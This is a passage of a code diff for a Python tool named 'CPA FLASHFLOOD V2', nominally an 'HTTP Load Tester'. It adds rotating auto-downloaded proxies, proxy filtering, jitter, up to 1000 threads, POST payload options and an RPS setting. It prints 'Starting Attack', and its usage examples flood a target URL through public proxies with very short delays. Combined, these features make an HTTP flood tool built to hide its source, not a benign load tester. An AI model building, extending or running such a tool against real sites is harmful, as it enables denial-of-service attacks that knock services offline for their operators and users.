-            delay_info = f" | jitter: {current_delay:.2f}s" if use_jitter else ""
-            print(f"{status_color}[{index:>2}] {r.status_code:>3} | {response_time:>5.2f}s | {proxy_str}{delay_info}{Colors.END}")
+            if success:
+                delay_info = f" | jitter: {current_delay:.2f}s" if use_jitter else ""
+                print(f"{status_color}[{index:>2}] {r.status_code:>3} | {response_time:>5.2f}s | {proxy_str}{delay_info}{Colors.END}")
+            else:
+                print(f"{Colors.RED}[{index:>2}] FAILED | {proxy_str}{Colors.END}")
             
             if current_delay > 0:
                 time.sleep(current_delay)
             
-        except requests.exceptions.ProxyError:
-            print(f"{Colors.RED}[{index:>2}] PROXY ERROR{Colors.END}")
-            time.sleep(0.5)
-        except requests.exceptions.Timeout:
-            print(f"{Colors.YELLOW}[{index:>2}] TIMEOUT{Colors.END}")
-            with lock:
-                total_requests += 1
-                failed_requests += 1
-                status_codes['TIMEOUT'] += 1
-            time.sleep(1)
-        except requests.exceptions.ConnectionError:
-            print(f"{Colors.YELLOW}[{index:>2}] CONNECTION ERROR{Colors.END}")
-            with lock:
-                total_requests += 1
-                failed_requests += 1
-                status_codes['CONNECTION_ERROR'] += 1
-            time.sleep(1)
         except Exception as e:
             print(f"{Colors.RED}[{index:>2}] ERROR: {str(e)[:30]}{Colors.END}")
             with lock:
@@ -662,13 +696,14 @@ def startTesting():
     global start_time
     start_time = time.time()
     
-    proxy_status = f"{len(ips)} proxies" if ips and use_proxy else "Direct"
-    update_interval = proxy_update_interval // 60
+    proxy_status = f"{len(filtered_ips) if filtered_ips else len(ips)} proxies" if ips and use_proxy else "Direct"
     print(f"{Colors.GREEN}🚀 Starting Attack{Colors.END}")
     print(f"{Colors.WHITE}Threads: {Colors.GREEN}{max_threads} | Timeout: {timeout}s | Delay: {request_delay}s{Colors.END}")
     print(f"{Colors.WHITE}Method: {Colors.GREEN}{method} | Proxy: {proxy_status}{Colors.END}")
     if auto_update_proxy:
-        print(f"{Colors.WHITE}Auto-Proxy: {Colors.GREEN}Enabled (update every {update_interval} min){Colors.END}")
+        print(f"{Colors.WHITE}Auto-Proxy: {Colors.GREEN}Enabled (update every {proxy_update_interval//60} min){Colors.END}")
+    if rps_limit > 0:
+        print(f"{Colors.WHITE}RPS Limit: {Colors.GREEN}{rps_limit}/s{Colors.END}")
     print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")
     
     threads = []
@@ -692,6 +727,8 @@ def startTesting():
                         rate = (success_requests / total_requests) * 100
                         rps = total_requests / elapsed if elapsed > 0 else 0
                         print(f"{Colors.WHITE}Success Rate: {Colors.GREEN}{rate:.1f}% | RPS: {rps:.1f}{Colors.END}")
+                    if rps_limit > 0:
+                        print(f"{Colors.WHITE}RPS Limit: {Colors.GREEN}{rps_limit}/s{Colors.END}")
                     print()
     except KeyboardInterrupt:
         print(f"\n\n{Colors.YELLOW}🛑 Stopping...{Colors.END}")
@@ -715,37 +752,43 @@ def startTesting():
             rate = (success_requests / total_requests) * 100
             rps = total_requests / elapsed if elapsed > 0 else 0
             print(f"{Colors.WHITE}Success Rate: {Colors.GREEN}{rate:.1f}% | RPS: {rps:.1f}{Colors.END}")
-        print(f"{Colors.GREEN}✅ CPA FLASHFLOOD Stopped!{Colors.END}\n")
+        print(f"{Colors.GREEN}✅ CPA FLASHFLOOD V2 Stopped!{Colors.END}\n")
 
 def showUsage():
     print(f"""
-{Colors.CYAN}CPA FLASHFLOOD v{__version__} - HTTP Load Tester{Colors.END}
+{Colors.CYAN}CPA FLASHFLOOD V2 v{__version__} - HTTP Load Tester{Colors.END}
 
 {Colors.GREEN}Usage:{Colors.END}
-  python flash.py --url <URL> [options]
+  python flashV2.py --url <URL> [options]
 
 {Colors.GREEN}Options:{Colors.END}
-  --url <URL>          Target URL
-  -t, --timeout <SEC>  Timeout (default: 10)
-  --threads <NUM>      Threads (default: 20, max: 500)
-  --delay <SEC>        Delay between requests (default: 1.0)
-  --no-proxy           Disable proxy
-  -X, --method <M>     HTTP method (GET, POST, etc.)
-  -H, --header <H>     Custom header (format: "Key: Value")
-  -j, --jitter <V>     Random delay (min,max or single)
-  -l, --log            Save log to file
-  --no-verify          Disable SSL verification
-  --no-redirect        Disable redirects
-  --retry <NUM>        Retry count
-  --retry-delay <SEC>  Retry delay
-  --auto-proxy         Auto-download proxies (update every 15 min)
-  --proxy-interval <M> Proxy update interval (minutes)
-  -h, --help           Show help
+  --url <URL>              Target URL
+  -t, --timeout <SEC>      Timeout (default: 10)
+  --threads <NUM>          Threads (default: 20, max: 1000)
+  --delay <SEC>            Delay between requests (default: 1.0)
+  --no-proxy               Disable proxy
+  -X, --method <M>         HTTP method (GET, POST, etc.)
+  -H, --header <H>         Custom header (format: "Key: Value")
+  -j, --jitter <V>         Random delay (min,max or single)
+  -l, --log                Save log to file
+  --no-verify              Disable SSL verification
+  --no-redirect            Disable redirects
+  --retry <NUM>            Retry count
+  --retry-delay <SEC>      Retry delay
+  --rps <NUM>              Rate limit per second
+  -d, --data <DATA>        POST/PUT/PATCH data
+  --data-file <FILE>       Load POST data from file
+  --auto-proxy             Auto-download proxies
+  --proxy-interval <M>     Proxy update interval (minutes)
+  --no-filter              Disable proxy filtering
+  --proxy-test-timeout <S> Proxy test timeout (default: 5)
+  -h, --help               Show help
 
 {Colors.GREEN}Examples:{Colors.END}
-  python flash.py --url https://httpbin.org/get --auto-proxy --threads 30 --delay 0.05
-  python flash.py --url https://example.com --no-proxy --threads 10 --jitter 0.5,1.5
-  python flash.py --url https://api.example.com --method POST -H "Content-Type: application/json" --auto-proxy
+  python flashV2.py --url https://httpbin.org/get --auto-proxy --threads 30 --delay 0.05
+  python flashV2.py --url https://example.com --no-proxy --threads 10 --jitter 0.5,1.5
+  python flashV2.py --url https://api.example.com --method POST -d "key=value" --auto-proxy --rps 100
+  python flashV2.py --url https://example.com --auto-proxy --no-filter --threads 50 --delay 0.02
 {Colors.END}""")
 
 if __name__ == '__main__':
